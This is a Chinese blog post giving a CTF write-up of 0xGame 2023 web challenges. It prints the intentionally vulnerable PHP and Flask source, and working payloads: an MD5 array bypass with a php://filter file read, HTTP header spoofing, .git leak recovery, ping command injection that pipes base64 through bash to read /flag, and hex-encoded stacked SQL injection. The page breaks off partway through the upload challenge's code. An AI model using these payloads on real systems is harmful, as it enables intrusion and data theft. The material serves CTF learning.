<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>0xGame 2023 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>0xGame 2023</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-22T07:33:54.356Z" id="date"> 2023-10-22</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-10-26T12:58:50.509Z" id="updated"> 2023-10-26</time></div></span><br><span>Word Count: <div class="control">6.3k</div></span><br><span>Read Time: <div class="control">29 min</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！</p>
<p>不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！）</p>
<h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="Week-1-signin"></a>[Week 1] signin</h2>
<p>![image-20231022153622957](0xGame 2023/image-20231022153622957.png)</p>
<p>首先打开之后是一个简单的页面，这里页面还说你能找到flag吗？-呵呵，我tm当然找不到了。。。</p>
<p>这里呢我尝试抓包以及dirsearch扫目录均无果，当时就焦虑了，我想着tm第一周的新手题就不会了？？？之后一下想到F12打开抓个包看看是否有信息，嗨，想不到真有</p>
<p>![image-20231022154409249](0xGame 2023/image-20231022154409249.png)</p>
<p>F12开启控制台随后重新刷新一下页面抓包，这里发现有页面的js文件源码，这时我就认为大概率就是此处了哈哈</p>
<p>![image-20231022154505505](0xGame 2023/image-20231022154505505.png)</p>
<p>一番搜索发现flag果然在此js文件下。</p>
<h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="Week-1-baby-php"></a>[Week 1] baby_php</h2>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>简单的PHP特性，这里首先要求传入的a、b参数不相等，但md5加密后的值要相等，我们直接数组绕过即可。</p>
<p>其次在接着判断c参数是否是数字，只有c满足不是数字，且c不等于1024，且c经过intval取整后等于1024即可包含flag.php文件</p>
<p>那首先是绕过is_numeric函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后<br></code></pre></td></tr></table></figure>
<p>根据上述我们可以实现绕过，不过这里直接在后面+其他字符如a也可以。</p>
<p>其次是<code>$c != 1024 &amp;&amp; intval($c) == 1024</code>这里可以看到有取整函数，那我们应该想到将c赋值为浮点类型，这样就可以成功绕过，并且 intval 也会截断非数字的部分</p>
<p>最终payload如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">GET：?a[]=1&amp;b[]=2<br>POST：c=1024.1a<br>cookie：name=php://filter/convert.base64-encode/resource=flag<br></code></pre></td></tr></table></figure>
<p>至于为何这里要用php伪协议读取，我猜测是如果直接赋值为flag.php的话，inlcude会执行php文件中的代码，导致最终结果不可见，故此选择伪协议读取，将文件内容进行base64编码导致其不可执行最终回显出来</p>
<p>![image-20231022160313639](0xGame 2023/image-20231022160313639.png)</p>
<p>如上图直接base64解码即可</p>
<h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="Week-1-hello-http"></a>[Week 1] hello_http</h2>
<p>![image-20231022160421773](0xGame 2023/image-20231022160421773.png)</p>
<p>这里考察http基础知识，根据页面信息我们选择get传参query为ctf</p>
<p>![image-20231022160629635](0xGame 2023/image-20231022160629635.png)</p>
<p>接着让我们post传参action为getflag</p>
<p>![image-20231022160651994](0xGame 2023/image-20231022160651994.png)</p>
<p>又提示我们不是admin，这里还是直接上bp吧</p>
<p>![image-20231022160725124](0xGame 2023/image-20231022160725124.png)</p>
<p>发现敏感词role，我们将其修改为admin</p>
<p>![image-20231022160754322](0xGame 2023/image-20231022160754322.png)</p>
<p>此时又提示我们不是内网ip，那我们用xff头修改一下看看</p>
<p>![image-20231022160844324](0xGame 2023/image-20231022160844324.png)</p>
<p>这时提示我们ua头不是指定的，那我们直接修改即可</p>
<p>![image-20231022160917710](0xGame 2023/image-20231022160917710.png)</p>
<p>最后又提示我们referer头来源不正确，那我们继续修改</p>
<p>![image-20231022161019184](0xGame 2023/image-20231022161019184.png)</p>
<p>拿到flag</p>
<h2 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="Week-1-repo-leak"></a>[Week 1] repo_leak</h2>
<p>![image-20231022161204842](0xGame 2023/image-20231022161204842.png)</p>
<p>如上图，我们看一下题目名称就可以猜到应该是信息泄露，此时dirsearch扫一下看看</p>
<p>![image-20231022161318450](0xGame 2023/image-20231022161318450.png)</p>
<p>如图发现很多关于git泄露的东西，这里直接上工具去利用漏洞：</p>
<p>使用<code>githack等工具</code>下载站点存储库的整个代码历史记录和配置信息。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHub - lijiejie/GitHack: A <code>.git</code> folder disclosure exploit</a></p>
<p>下载地址如上，注意是python2环境，具体用法参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43511094/article/details/123634720?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=git%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-123634720.142%5Ev96%5Epc_search_result_base4&amp;spm=1018.2226.3001.4187">Git泄露总结</a></p>
<p>用法如下：在工具所在目录打开cmd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python2 GitHack.py http://120.27.148.152:50013/.git/<br></code></pre></td></tr></table></figure>
<p>![image-20231022162258605](0xGame 2023/image-20231022162258605.png)</p>
<p>![image-20231022163523977](0xGame 2023/image-20231022163523977.png)</p>
<p>随后进入目标url所在目录</p>
<p>![image-20231022163541284](0xGame 2023/image-20231022163541284.png)</p>
<p>首先查看一下git日志，可以看到哪一个人在哪个时间提交了那一个文件，每一个commit都会生成一个哈希值，这个值是唯一的，相当于commit的身份证</p>
<p>这里可以看到在 第二次提交的时候看到其提交了flag，那我们查看一下</p>
<p>![image-20231022163710703](0xGame 2023/image-20231022163710703.png)</p>
<p>git reflog：可以查看近期所有的提交记录，这样就可以回滚到任意一个版本</p>
<p>接下来查看flag所在的8a5b670：git show 8a5b670</p>
<p>![image-20231022163941388](0xGame 2023/image-20231022163941388.png)</p>
<p>可以进一步查看提交的文件内容，找到flag</p>
<h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="Week-1-ping"></a>[Week 1] ping</h2>
<p>![image-20231022164257042](0xGame 2023/image-20231022164257042.png)</p>
<p>打开是一个ping命令执行页面，我们先查看一下源码看看有什么信息</p>
<p>![image-20231022164321959](0xGame 2023/image-20231022164321959.png)</p>
<p>果然这里提示我们访问一下api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>结果发现这里是前面ping页面的源码，这里可以看到过滤了分号，空格，斜杠以及flag关键词，不过这里对我们传入的ip执行了正则的过滤，这里过滤的很全，似乎是只允许数字的，这里我们尝试换行绕过</p>
<p>先搞一个对上述正则的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">整个正则表达式用于匹配IPv4地址的所有四个部分，确保每个部分的值在0到255之间，且用点号分隔。这是一个有效的IPv4地址验证正则表达式。<br></code></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ip=127.0.0.1%0als<br></code></pre></td></tr></table></figure>
<p>![image-20231022165222349](0xGame 2023/image-20231022165222349.png)</p>
<p>如上图看到成功执行，那现在就是考虑如果绕过过滤读取到flag了，这里肯定就要用到编码之类的</p>
<p>空格过滤的话我们可以用&lt;&gt;或者${IFS}等等，至于分号的过滤（大概率是避免我们的变量拼接吧）这里网站文章翻翻发现base64编码就可以绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bHMgLw==&quot;</span>|base64 -d|bash ==&gt;ls /<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Y2F0IC9mbGFn&quot;</span>|base64 -d|bash ==&gt;cat /flag<br>    <br>注意上述的payload之前的空格符用$&#123;IFS&#125;代替即可绕过<br></code></pre></td></tr></table></figure>
<p>![image-20231022165608398](0xGame 2023/image-20231022165608398.png)</p>
<p>![image-20231022165735258](0xGame 2023/image-20231022165735258.png)</p>
<p>拿到flag</p>
<h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="Week-2-ez-sqli"></a>[Week 2] ez_sqli</h2>
<p>![image-20231022170307981](0xGame 2023/image-20231022170307981.png)</p>
<p>随后在下载题目给的附件，是一串python源码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> MySQLdb<br><span class="hljs-keyword">import</span> re<br><br>blacklist = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;column&#x27;</span>, <span class="hljs-string">&#x27;alter&#x27;</span>, <span class="hljs-string">&#x27;create&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;xor&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;then&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>]<br><br>conn = MySQLdb.connect(host=<span class="hljs-string">&#x27;db&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, passwd=<span class="hljs-string">&#x27;root&#x27;</span>, db=<span class="hljs-string">&#x27;ctf&#x27;</span>)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    field = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>)<br>    field = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, field)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():<br>            <span class="hljs-keyword">return</span> s + <span class="hljs-string">&#x27; are banned&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;id|name|email&quot;</span>, field):<br>        field = <span class="hljs-string">&#x27;id&#x27;</span><br><br>    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)<br>        res = cursor.fetchall()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, res=res)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>这里呢设置了黑名单过滤了很多敏感词，之后如果访问/路由的话，或自动执行index函数</p>
<p>随后检查get参数的order和id，遍历黑名单数组查看是否存在敏感字词。接着查看传入的field是否是id，name，email中的一个，如果不是则默认配置为id，之后执行 sql语句根据field内容查找回显内容</p>
<p>这里分析完之后我依旧没什么思路，太菜了，这里也是看了hint发现可以堆叠注入，他说是敏感函数<code>cursor.execute</code>可以 执行多条sql语句，事后诸葛亮的我悟了，看来日后分析代码时，也要搜寻相关函数的用法来找漏洞。</p>
<p>既然提示我们是堆叠注入，且其中黑名单过滤的很多以及sub去掉了空白字符（也就是过滤空格），因此这里我又没思路了，只能看wp了，发现其利用的是mysql预处理知识，但我还没仔细学过，因此这里我直接大概了解一下上个payload，之后认真学习一番（最近事情好多，真累啊~~）</p>
<p>wp讲的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">考察 MySQL 堆叠注⼊ + 预处理语句绕过 WAF<br><br>⿊名单过滤了常⻅的 SQL 关键词, 正常没办法进⾏ SQL 注⼊, sqlmap 也跑不出来<br><br>⾸先得知道 mysqlclient (MySQLdb) 的 cursor.execute() ⽀持执⾏多条 SQL 语句, 这个也给了 hint<br><br>然后, MySQL ⽀持 SQL 语句的预处理 (set prepare execute), 这个⽹上搜搜也能找到对应的⽂章和 payload<br></code></pre></td></tr></table></figure>
<p>预处理语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare stmt from &#x27;SELECT * FROM users WHERE id=?&#x27;;<br>set @id=1;<br>execute stmt using @id;<br></code></pre></td></tr></table></figure>
<p>这里我们用报错注入去搞，但报错注入回显内容有限，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"># step <span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># step <span class="hljs-number">2</span><br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag),<span class="hljs-number">31</span>,<span class="hljs-number">99</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>
<p>这里由于黑名单的存在，因此wp将其进行了ASCII码16进制编码绕过：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"># step <span class="hljs-number">1</span><br>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span><br><span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c312c333129292c30783<br><span class="hljs-number">765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;<br># step <span class="hljs-number">2</span><br>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span><br><span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c33312c393929292c307<br><span class="hljs-number">83765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;<br></code></pre></td></tr></table></figure>
<p>emmm大概原理是set一条待执行语句，随后将其置入prepare预处理中，接着execute执行（也没仔细学，说错了别打┭┮﹏┭┮）</p>
<p>![image-20231022174720144](0xGame 2023/image-20231022174720144.png)</p>
<p>![image-20231022174737683](0xGame 2023/image-20231022174737683.png)</p>
<p>找到flag</p>
<h2 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="Week-2-ez-upload"></a>[Week 2] ez_upload</h2>
<p>![image-20231022221053241](0xGame 2023/image-20231022221053241.png)</p>
<p>打开题目是一个文件上传题，我们下载附件可以看到对应源码，那直接分析一波</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$user_dir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$user_dir</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>        &lt;title&gt;Gravatar&lt;/title&gt;<br>        &lt;script src=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;script src=<span class="hljs-string">&quot;https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;<br>        &lt;link href=<span 